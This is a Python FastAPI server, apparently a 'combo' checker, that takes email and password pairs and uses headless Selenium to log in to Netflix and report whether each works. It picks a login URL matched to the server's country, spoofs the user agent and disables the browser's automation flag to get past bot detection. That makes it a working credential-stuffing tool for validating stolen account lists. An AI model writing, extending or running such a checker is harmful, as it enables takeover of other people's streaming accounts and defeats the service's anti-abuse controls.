# server.py
import os
import time
import requests

from fastapi import FastAPI, HTTPException, Header
from pydantic import BaseModel
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException

from countries import find_IP  # returns (ip, country, country_code)

API_KEY = os.getenv("API_KEY", "changeme")
LOGIN_URL = "https://www.netflix.com/login"

app = FastAPI(title="Geo-Aware Netflix Checker")

# On startup, discover public IP + country + best-login URL
@app.on_event("startup")
def load_location():
    global PUBLIC_IP, GEO_COUNTRY, GEO_CODE, LOGIN_URL

    PUBLIC_IP, GEO_COUNTRY, GEO_CODE = find_IP()  # e.g. ("1.2.3.4","Philippines","PH")
    code      = GEO_CODE.lower()
    candidate = f"https://www.netflix.com/{code}-en/login"

    try:
        # GET + sniff for the email field instead of HEAD
        resp = requests.get(candidate, timeout=5)
        if 'name="userLoginId"' in resp.text:
            LOGIN_URL = candidate
        else:
            LOGIN_URL = "https://www.netflix.com/login"
    except Exception:
        LOGIN_URL = "https://www.netflix.com/login"

    print(f"[startup] Public IP: {PUBLIC_IP}, Country: {GEO_COUNTRY} ({GEO_CODE})")
    print(f"[startup] Using LOGIN_URL = {LOGIN_URL}")

class Combo(BaseModel):
    email: str
    password: str

def make_driver():
    opts = Options()
    opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-gpu")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--window-size=1920,1080")
    opts.add_argument("--disable-blink-features=AutomationControlled")
    opts.add_argument(
        "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/114.0.5735.199 Safari/537.36"
    )
    return webdriver.Chrome(options=opts)

@app.post("/check", summary="Headless Netflix login check")
def check_combo(
    combo: Combo,
    x_api_key: str = Header(..., alias="x-api-key"),
):
    if x_api_key != API_KEY:
        raise HTTPException(401, "Invalid API key")

    driver = make_driver()
    wait   = WebDriverWait(driver, 15)
    try:
        driver.get(LOGIN_URL)
        wait.until(EC.presence_of_element_located((By.NAME, "userLoginId")))

        # Dismiss cookie banner
        try:
            btn = driver.find_element(By.ID, "onetrust-reject-all-handler")
            btn.click(); time.sleep(0.5)
        except NoSuchElementException:
            pass

        # Toggle “Use password” if PIN-first
        try:
            toggle = driver.find_element(
                By.CSS_SELECTOR, "button[data-uia='login-toggle-button']"
            )
            if "Use password" in toggle.text:
                toggle.click(); time.sleep(0.5)
        except NoSuchElementException:
            pass

        # Fill & submit
        email_el = wait.until(EC.element_to_be_clickable((By.NAME, "userLoginId")))
        pwd_el   = driver.find_element(By.NAME, "password")
        email_el.clear(); email_el.send_keys(combo.email)
        pwd_el.clear();   pwd_el.send_keys(combo.password)
        pwd_el.send_keys(u"\ue007")  # ENTER

        # Wait for success
        try:
            wait.until(lambda d:
                d.current_url.startswith("https://www.netflix.com/browse")
                or "profiles-gate-container" in d.page_source
            )
            success = True
        except TimeoutException:
            success = False

        return {
            "ok": success,
            "server_ip": PUBLIC_IP,
            "server_country": GEO_COUNTRY,
            "server_code": GEO_CODE,
            "login_url": LOGIN_URL,
        }

    except TimeoutException:
        raise HTTPException(500, "Netflix page load timeout")
    finally:
        driver.quit()
